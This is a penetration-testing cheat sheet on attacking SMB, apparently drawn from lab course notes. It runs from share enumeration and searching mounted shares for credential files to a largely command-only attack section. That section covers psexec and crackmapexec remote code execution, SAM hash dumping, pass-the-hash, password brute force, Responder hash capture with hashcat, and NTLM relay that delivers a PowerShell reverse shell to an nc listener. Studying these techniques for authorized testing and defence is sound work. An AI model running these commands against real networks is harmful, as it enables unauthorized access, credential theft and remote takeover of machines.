Server Message Block (`SMB`) is a protocol responsible for transferring data between a client and a server in local area networks. It is used to implement file and directory sharing and printing services in Windows networks. SMB is also known as Common Internet File System (`CIFS`). It is part of the SMB protocol and enables universal remote connection of multiple platforms such as Windows, Linux, or macOS. In addition, we will often encounter `Samba`, which is an open-source implementation of the above functions.
# Enumeration
Display a list (-L) of the server's shares with the smbclient command from our host. We use the so-called null session (-N), which is anonymous access without the input of existing users or valid passwords.
```
smbclient -N -L \\\\<target ip>
```
```
smbclient -L //10.10.10.178 -U ""
```
Connect as the guest user
```
smbclient \\\\<target ip>\\users
```
Connect using credentials for the user bob (bob:Welcome1).
```
smbclient -U bob \\\\<target ip>\\users
```
```
smbclient -U user \\\\10.129.42.197\\SHARENAME
```
## rpcclient
rpcclient offers us many different requests with which we can execute specific functions on the SMB server to get information
```
rpcclient -U "" <ip>
```
Rpcclient - User Enumeration
```
rpcclient $> enumdomusers
```
Rpcclient - Group Information
```
rpcclient $> querygroup 0x201
```
## SMBMap
```
smbmap -H 10.129.14.128
```
List contents of accessible directory
```
smbmap -R <accessibledirectory> -H <attackip>
```
```
smbmap -R <accessibledirectory> -H <attackip> -A <filetoDownload> -q
```
```
updatedb
```
```
locate <filetoDownload>
```
If you have credentials
```
smbmap -d <domainname> -u <user> -p <password> -H <ip>
```
List the files in the READ ONLY share
```
smbmap -d <domainname> -u <user> -p <password> -H <ip> -R <ReadOnlyShare>
```
## CrackMapExec
```
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```
```
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```

## Enum4Linux-ng
```
git clone https://github.com/cddmp/enum4linux-ng.git
```
```
cd enum4linux-ng
```
```
pip3 install -r requirements.txt
```
```
./enum4linux-ng.py <ip> -A
```
## Download All available Files
```
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
```

# Mounting SMB Share
## Windows
### Windows CMD
Suppose the shared folder allows anonymous authentication, or we are authenticated with a user who has privilege over that shared folder. In that case, we will not receive any form of authentication request, and it will display the content of the shared folder. If we do not have access, we will receive an authentication request.
We can press [WINKEY] + [R] to open the Run dialog box and type the file share location, e.g.: \\192.168.220.129\Finance\
#### Windows CMD - DIR
```
C:\htb> dir \\192.168.220.129\Finance\
```
#### Windows CMD - Net Use
```
C:\htb> net use n: \\192.168.220.129\Finance
```
We can also provide a username and password to authenticate to the share
```
C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123
```
With the shared folder mapped as the n drive, we can execute Windows commands as if this shared folder is on our local computer. Let's find how many files the shared folder and its subdirectories contain.
#### Windows CMD - DIR
```
C:\htb> dir n: /a-d /s /b | find /c ":\"
```
With dir we can search for specific names in files such as:
```
C:\htb>dir n:\*cred */s /ba
```
```
C:\htb>dir n:\*secret* /s /b
```
#### Windows CMD - Findstr
```
C:\htb>findstr /s /i cred n:\*.*
```
### Windows Powershell
```
PS C:\htb> Get-ChildItem \\192.168.220.129\Finance\
```
```
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
```
To provide a username and password with Powershell, we need to create a PSCredential object. It offers a centralized way to manage usernames, passwords, and credentials.
```
PS C:\htb> $username = 'plaintext'
```
```
PS C:\htb> $password = 'Password123'
```
```
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
```
```
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
```
```
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
```

```
PS C:\htb> N:
```
In PowerShell, we can use the command Get-ChildItem or the short variant gci instead of the command dir.
```
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count
```
We can use the property -Include to find specific items from the directory specified by the Path parameter.
```
PS C:\htb> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```
The Select-String cmdlet uses regular expression matching to search for text patterns in input strings and files. We can use Select-String similar to grep in UNIX or findstr.exe in Windows.
```
PS C:\htb> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```
## Linux 
```
sudo mkdir /mnt/Finance
```
```
sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```
```
sudo mount -t cifs -o username=<user>,password=<password> //<targetIP>/<share> /mnt
```
As an alternative, we can use a credential file.
```
mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```
The file credential file has to be structured like this
```
username=plaintext
password=Password123
domain=.
```
We need to install cifs-utils to connect to an SMB share folder. To install it we can execute from the command line 
```
sudo apt install cifs-utils
```
Once a shared folder is mounted, you can use common Linux tools such as find or grep to interact with the file structure. Let's hunt for a filename that contains the string cred
```
find /mnt/Finance -name *cred*
```
Find files that contain the string cred
```
grep -rn /mnt/Finance/ -ie cred
```
# Attacking SMB
### metasploit
SMB exploit using metasploit
```
use exploit(windows/smb/psexec)
```
```
use auxiliary/scanner/smb/smb_login
```
Download files where msfconsole was opened
```
download <file.txt>
```
Upload files
```
upload <file.zip>
```
### rpcclient
We can use the rpcclient to brute force the RIDs to get information.
```
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
```
samrdump.py 10.129.14.128
```
Change a user password (if you have `ForceChangePassword` privilege for example)
```
setuserinfo2 <user> 23 '<password>'
```
### SMB Brute Force
```
hydra -L user.list -P password.list smb://10.129.42.197
```

## Remote Code Execution (RCE)
### Impacket
Impacket PsExec, the same options apply to impacket-smbexec and impacket-atexec
```
impacket-psexec administrator:'Password123!'@10.10.110.17
```
### CrackMapExec 
The option -x to run cmd commands or uppercase -X to run PowerShell commands.
```
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
If the --exec-method is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the --exec-method smbexec
#### Enumerating Logged-on Users
Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use CrackMapExec to enumerate logged-on users on all machines within the same network 10.10.110.17/24, which speeds up our enumeration process.
```
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```
#### Extract Hashes from SAM Database
```
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```
#### Pass-the-Hash (PtH)
If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). We can use a PtH attack with any Impacket tool, SMBMap, CrackMapExec, among other tools. Here is an example of how this would work with CrackMapExec:
```
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
## Forced Authentication Attacks
We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes. Responder is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes.
```
sudo responder -I ens33
```
These captured credentials can be cracked using hashcat or relayed to a remote host to complete the authentication and impersonate the user. All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. Let us see an example using impacket-ntlmrelayx.
1. First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).
```
cat /etc/responder/Responder.conf | grep 'SMB ='
```
2. Then we execute impacket-ntlmrelayx with the option --no-http-server, -smb2support, and the target machine with the option -t. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option -c.
```
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```
3. We can create a PowerShell reverse shell using https://www.revshells.com/, set our machine IP address, port, and the option Powershell #3 (Base64).
```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c <Powershell rev shell code>
```
```
nc -lvnp 9001
```





